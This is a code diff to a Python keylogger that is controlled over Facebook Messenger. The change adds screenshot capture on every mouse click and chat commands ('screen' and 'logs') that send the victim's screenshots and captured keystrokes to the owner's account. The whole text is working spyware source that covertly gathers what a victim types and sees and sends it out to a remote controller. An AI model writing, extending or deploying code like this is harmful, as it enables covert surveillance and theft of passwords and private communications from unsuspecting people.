@@ -1,5 +1,7 @@
 import os
 import keyboard
+from keyboard import mouse
+import pyscreenshot
 import fbchat
 
 
@@ -14,7 +16,10 @@ class FacebookController(fbchat.Client):
         self.send(self.owner_uid, message)
 
     def on_message(self, mid, author_id, author_name, message, metadata):
-        self.send_to_owner(''.join(self.keylogger.flush_captured_keys()))
+        if message == 'screen':
+            self.sendLocalImage(self.owner_uid, message='to widzialem', image='/tmp/screen.jpg')
+        if message == 'logs':
+            self.send_to_owner(''.join(self.keylogger.flush_captured_keys()))
 
 
 class Keylogger(object):
@@ -24,10 +29,15 @@ class Keylogger(object):
 
         keyboard.on_press(self._on_key_press)
         keyboard.add_hotkey('ctrl+v', self._on_paste)
+        keyboard.mouse.on_click(self._on_left_mouse_button_click)
 
     def flush_captured_keys(self):
         captured_keys, self.captured_keys = self.captured_keys, []
         return captured_keys
+
+    def _on_left_mouse_button_click(self):
+        screenshot = pyscreenshot.grab()
+        screenshot.save('/tmp/screen.jpg')
 
     def _on_key_press(self, event):
         if len(event.name) > 1:
